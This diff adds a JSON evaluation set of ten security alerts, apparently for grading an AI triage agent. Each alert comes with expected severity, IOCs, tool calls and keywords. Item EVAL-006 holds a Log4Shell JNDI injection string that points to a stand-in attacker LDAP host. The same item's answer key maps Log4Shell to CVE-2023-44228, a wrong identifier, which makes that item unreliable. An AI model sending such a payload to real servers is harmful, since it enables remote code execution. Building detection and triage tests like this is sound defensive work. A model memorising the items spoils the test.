@@ -1,0 +1,132 @@
+[
+  {
+    "id": "EVAL-001",
+    "name": "SSH Brute Force — Critical IP",
+    "alert": "Mar 15 14:23:01 webserver sshd[12345]: Failed password for root from 185.220.101.1 port 22 ssh2",
+    "source": "syslog",
+    "expected": {
+      "severity": "high",
+      "iocs": ["185.220.101.1"],
+      "should_contain_tools": ["parse_syslog", "query_ip_reputation"],
+      "should_mention": ["Tor exit node", "block", "firewall"],
+      "requires_mitigation": true
+    }
+  },
+  {
+    "id": "EVAL-002",
+    "name": "CVE Reference in Log",
+    "alert": "Mar 16 09:15:33 app-server-02 webapp[5678]: ERROR Attempted exploitation of CVE-2024-3094 detected from 45.33.32.156",
+    "source": "syslog",
+    "expected": {
+      "severity": "critical",
+      "iocs": ["CVE-2024-3094", "45.33.32.156"],
+      "should_contain_tools": ["parse_syslog", "lookup_cve", "query_ip_reputation"],
+      "should_mention": ["XZ Utils", "backdoor", "critical", "immediate"],
+      "requires_mitigation": true
+    }
+  },
+  {
+    "id": "EVAL-003",
+    "name": "FortiOS VPN Exploit Attempt",
+    "alert": "Intrusion detected: FortiGate fw-edge-01 reports SSL VPN exploit attempt matching CVE-2024-21762 from external IP 185.220.101.1. Multiple failed authentication attempts observed.",
+    "source": "siem",
+    "expected": {
+      "severity": "critical",
+      "iocs": ["CVE-2024-21762", "185.220.101.1"],
+      "should_contain_tools": ["lookup_cve", "query_ip_reputation"],
+      "should_mention": ["FortiOS", "SSL VPN", "upgrade", "block"],
+      "requires_mitigation": true
+    }
+  },
+  {
+    "id": "EVAL-004",
+    "name": "Benign DNS Query",
+    "alert": "Mar 17 03:00:00 dns-resolver named[1234]: query: google.com IN A + (8.8.8.8)",
+    "source": "syslog",
+    "expected": {
+      "severity": "info",
+      "iocs": ["8.8.8.8"],
+      "should_contain_tools": ["parse_syslog"],
+      "should_mention": ["benign", "no action", "Google"],
+      "requires_mitigation": false
+    }
+  },
+  {
+    "id": "EVAL-005",
+    "name": "Lateral Movement Detection",
+    "alert": "ALERT: Suspicious lateral movement detected. Host db-primary (10.0.1.50) initiated unusual SMB connections to 10.0.1.51, 10.0.1.52, 10.0.1.53. Process: cmd.exe /c net use. Hash: d41d8cd98f00b204e9800998ecf8427e",
+    "source": "edr",
+    "expected": {
+      "severity": "critical",
+      "iocs": ["10.0.1.50", "10.0.1.51", "d41d8cd98f00b204e9800998ecf8427e"],
+      "should_contain_tools": ["extract_iocs", "query_ip_reputation"],
+      "should_mention": ["lateral movement", "SMB", "isolate", "containment"],
+      "requires_mitigation": true
+    }
+  },
+  {
+    "id": "EVAL-006",
+    "name": "Log4Shell Variant Detection",
+    "alert": "WAF Alert: Payload contains JNDI injection pattern ${jndi:ldap://attacker.evil.com/exploit} targeting /api/login endpoint on app-server-02. CVE-2023-44228 match. Source IP: 192.168.100.55",
+    "source": "waf",
+    "expected": {
+      "severity": "critical",
+      "iocs": ["CVE-2023-44228", "192.168.100.55", "attacker.evil.com"],
+      "should_contain_tools": ["lookup_cve", "extract_iocs"],
+      "should_mention": ["Log4j", "JNDI", "block", "patch"],
+      "requires_mitigation": true
+    }
+  },
+  {
+    "id": "EVAL-007",
+    "name": "Phishing Email Report",
+    "alert": "User reported suspicious email from security-update@micros0ft-support.com with attachment invoice_q4.exe (SHA256: 7d865e959b2466918c9863afca942d0fb89d7c9ac0c99bafc3749504ded97730). URL in body: https://micros0ft-support.com/update/download",
+    "source": "email_gateway",
+    "expected": {
+      "severity": "high",
+      "iocs": ["security-update@micros0ft-support.com", "7d865e959b2466918c9863afca942d0fb89d7c9ac0c99bafc3749504ded97730", "micros0ft-support.com"],
+      "should_contain_tools": ["extract_iocs"],
+      "should_mention": ["phishing", "typosquat", "block domain", "quarantine"],
+      "requires_mitigation": true
+    }
+  },
+  {
+    "id": "EVAL-008",
+    "name": "Routine Cron Job Log",
+    "alert": "Mar 18 02:00:00 backup-server CRON[9876]: (root) CMD (/usr/local/bin/backup.sh --full --target /mnt/backup)",
+    "source": "syslog",
+    "expected": {
+      "severity": "info",
+      "iocs": [],
+      "should_contain_tools": ["parse_syslog"],
+      "should_mention": ["routine", "backup", "no action"],
+      "requires_mitigation": false
+    }
+  },
+  {
+    "id": "EVAL-009",
+    "name": "Multiple CVE Exploit Chain",
+    "alert": "CRITICAL: Attack chain detected on web-server-01. Initial access via CVE-2024-21762 (FortiOS), followed by exploitation of CVE-2024-3094 (XZ Utils) for persistence. Attacker IP: 185.220.101.1. C2 beacon to 198.51.100.42:443 every 60 seconds.",
+    "source": "siem",
+    "expected": {
+      "severity": "critical",
+      "iocs": ["CVE-2024-21762", "CVE-2024-3094", "185.220.101.1", "198.51.100.42"],
+      "should_contain_tools": ["lookup_cve", "query_ip_reputation"],
+      "should_mention": ["attack chain", "persistence", "C2", "isolate", "incident response"],
+      "requires_mitigation": true
+    }
+  },
+  {
+    "id": "EVAL-010",
+    "name": "Data Exfiltration via DNS",
+    "alert": "DLP Alert: Anomalous DNS query volume from db-primary (10.0.1.50). Over 500 TXT queries to c2.evil-domain.net in last 10 minutes. Encoded payloads detected in subdomain labels: aGVsbG8gd29ybGQ.c2.evil-domain.net",
+    "source": "dns_monitor",
+    "expected": {
+      "severity": "critical",
+      "iocs": ["10.0.1.50", "c2.evil-domain.net"],
+      "should_contain_tools": ["extract_iocs", "query_ip_reputation"],
+      "should_mention": ["DNS tunneling", "exfiltration", "block domain", "isolate"],
+      "requires_mitigation": true
+    }
+  }
+]
